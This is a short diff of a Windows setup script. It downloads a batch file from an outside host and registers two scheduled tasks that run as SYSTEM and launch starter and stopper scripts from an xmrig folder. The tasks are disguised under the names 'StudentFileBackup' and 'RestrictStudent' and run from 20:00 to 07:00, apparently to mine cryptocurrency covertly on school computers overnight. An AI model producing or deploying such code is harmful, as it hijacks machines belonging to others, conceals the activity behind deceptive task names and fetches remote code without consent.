@@ -33,6 +33,6 @@ iwr https://www.thatonelukas.tk/masseisStopper.bat -OutFile stopper.bat
 
 # schedule task
 echo "schedule task"
-schtasks /create /sc daily /tn StudentFileBackup /st 20:00 /ru System /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat"
+schtasks /create /sc daily /tn StudentFileBackup /st 20:00 /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat" /ru System
 echo "schedule task 2"
-schtasks /create /sc daily /tn RestrictStudent /st 07:00 /ru System /tr "C:\ProgramData\xmrig\xmrig-6.8.2\stopper.bat"
+schtasks /create /sc daily /tn RestrictStudent /st 07:00 /tr "C:\ProgramData\xmrig\xmrig-6.8.2\stopper.bat" /ru System
